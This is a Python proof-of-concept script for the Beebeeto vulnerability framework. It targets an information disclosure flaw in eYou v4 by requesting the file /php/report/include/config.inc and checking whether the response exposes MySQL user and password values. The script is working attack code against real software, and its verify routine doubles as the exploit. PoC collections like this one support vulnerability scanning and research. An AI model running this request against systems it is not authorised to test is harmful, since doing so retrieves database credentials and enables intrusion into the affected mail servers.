#!/usr/bin/env python
# coding=utf-8

"""
Site: http://www.beebeeto.com/
Framework: https://github.com/n0tr00t/Beebeeto-framework
"""

import urllib2

from baseframe import BaseFrame


class MyPoc(BaseFrame):
    poc_info = {
        # poc相关信息
        'poc': {
            'id': 'poc-2014-0211',
            'name': 'eYou v4 /php/report/include/config.inc 信息泄露漏洞 POC',
            'author': 'xiangshou',
            'create_date': '2014-12-18',
        },
        # 协议相关信息
        'protocol': {
            'name': 'http',
            'port': [80],
            'layer4_protocol': ['tcp'],
        },
        # 漏洞相关信息
        'vul': {
            'app_name': 'eyou',
            'vul_version': ['4'],
            'type': 'Information Disclosure',
            'tag': ['eYou', '敏感信息泄漏', '/php/report/include/config.inc', 'php'],
            'desc': '漏洞文件：/php/report/include/config.inc',
            'references': ['http://wooyun.org/bugs/wooyun-2014-058462',
            ],
        },
    }


    @classmethod
    def verify(cls, args):
        payload = '/php/report/include/config.inc'
        verify_url = args['options']['target'] + payload
        req = urllib2.Request(verify_url)
        if args['options']['verbose']:
            print '[*] Request URL: ' + verify_url
        content = urllib2.urlopen(req).read()
        if 'MYSQL_USER' in content and 'MYSQL_PASS' in content:
            args['success'] = True
            args['poc_ret']['vul_url']= verify_url
        return args

    exploit = verify


if __name__ == '__main__':
    from pprint import pprint

    mp = MyPoc()
    pprint(mp.run())